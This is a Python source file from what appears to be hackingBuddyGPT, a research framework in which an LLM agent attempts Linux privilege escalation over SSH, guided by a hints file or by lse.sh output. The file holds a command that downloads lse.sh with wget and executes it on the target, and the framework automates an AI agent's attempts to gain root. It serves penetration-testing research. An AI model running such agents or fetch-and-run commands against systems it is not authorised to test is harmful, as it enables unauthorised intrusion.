import json
import pathlib
from dataclasses import dataclass
from mako.template import Template

from hackingBuddyGPT.capabilities import SSHRunCommand, SSHTestCredential
from .common import Privesc
from hackingBuddyGPT.utils import SSHConnection
from hackingBuddyGPT.usecases.base import use_case, UseCase
from hackingBuddyGPT.utils.console.console import Console
from hackingBuddyGPT.utils.db_storage.db_storage import DbStorage
from hackingBuddyGPT.utils.openai.openai_llm import OpenAIConnection

template_dir = pathlib.Path(__file__).parent / "templates"
template_next_cmd = Template(filename=str(template_dir / "query_next_command.txt"))
template_analyze = Template(filename=str(template_dir / "analyze_cmd.txt"))
template_state = Template(filename=str(template_dir / "update_state.txt"))
template_lse = Template(filename=str(template_dir / "get_hint_from_lse.txt"))

@use_case("linux_privesc_hintfile", "Linux Privilege Escalation using a hints file")
@dataclass
class PrivescWithHintFile(UseCase):
    conn: SSHConnection = None
    system: str = ''
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False
    hints: str = ""

    # all of these would typically be set by RoundBasedUseCase :-/
    # but we need them here so that we can pass them on to the inner
    # use-case
    log_db: DbStorage = None
    console: Console = None
    llm: OpenAIConnection = None
    tag: str = ""
    max_turns: int = 10

    def init(self):
        super().init()

    # simple helper that reads the hints file and returns the hint
    # for the current machine (test-case)
    def read_hint(self):
        if self.hints != "":
            try:
                with open(self.hints, "r") as hint_file:
                    hints = json.load(hint_file)
                    if self.conn.hostname in hints:
                        return hints[self.conn.hostname]
            except:
                self.console.print("[yellow]Was not able to load hint file")
        else:
            self.console.print("[yellow]calling the hintfile use-case without a hint file?")
        return ""

    def run(self):
        # read the hint
        hint = self.read_hint()
         
        # call the inner use-case
        priv_esc = LinuxPrivesc(
            conn=self.conn, # must be set in sub classes
            enable_explanation=self.enable_explanation,
            disable_history=self.disable_history,
            hint=hint,
            log_db = self.log_db,
            console = self.console,
            llm = self.llm,
            tag = self.tag,
            max_turns = self.max_turns
        )

        priv_esc.init()
        priv_esc.run()

@use_case("linux_privesc_guided", "Linux Privilege Escalation using lse.sh for initial guidance")
@dataclass
class PrivescWithLSE(UseCase):
    conn: SSHConnection = None
    system: str = ''
    enable_explanation: bool = False
    enable_update_state: bool = False
    disable_history: bool = False

    # all of these would typically be set by RoundBasedUseCase :-/
    # but we need them here so that we can pass them on to the inner
    # use-case
    log_db: DbStorage = None
    console: Console = None
    llm: OpenAIConnection = None
    tag: str = ""
    max_turns: int = 10
    low_llm: OpenAIConnection = None

    def init(self):
        super().init()

    # simple helper that uses lse.sh to get hints from the system
    def read_hint(self):
        
        self.console.print("[green]performing initial enumeration with lse.sh")

        run_cmd = "wget -q 'https://github.com/diego-treitos/linux-smart-enumeration/releases/latest/download/lse.sh' -O lse.sh;chmod 700 lse.sh; ./lse.sh -c -i -l 0 | grep -v 'nope$' | grep -v 'skip$'"

        result, got_root = SSHRunCommand(conn=self.conn, timeout=120)(run_cmd)

        self.console.print("[yellow]got the output: " + result)
        cmd = self.llm.get_response(template_lse, lse_output=result, number=3)
        self.console.print("[yellow]got the cmd: " + cmd.result)

        return cmd.result

    def run(self):
        # read the hint
        hint = self.read_hint()

        for i in hint.splitlines():
            self.console.print("[green]Now using Hint: " + i)
         
            # call the inner use-case
            priv_esc = LinuxPrivesc(
                conn=self.conn, # must be set in sub classes
                enable_explanation=self.enable_explanation,
                disable_history=self.disable_history,
                hint=i,
                log_db = self.log_db,
                console = self.console,
                llm = self.low_llm,
                tag = self.tag + "_hint_" +i,
                max_turns = self.max_turns
            )

            priv_esc.init()
            if priv_esc.run():
                # we are root! w00t!
                return True

@use_case("linux_privesc", "Linux Privilege Escalation")
@dataclass
class LinuxPrivesc(Privesc):
    conn: SSHConnection = None
    system: str = "linux"

    def init(self):
        super().init()
        self.add_capability(SSHRunCommand(conn=self.conn), default=True)
        self.add_capability(SSHTestCredential(conn=self.conn))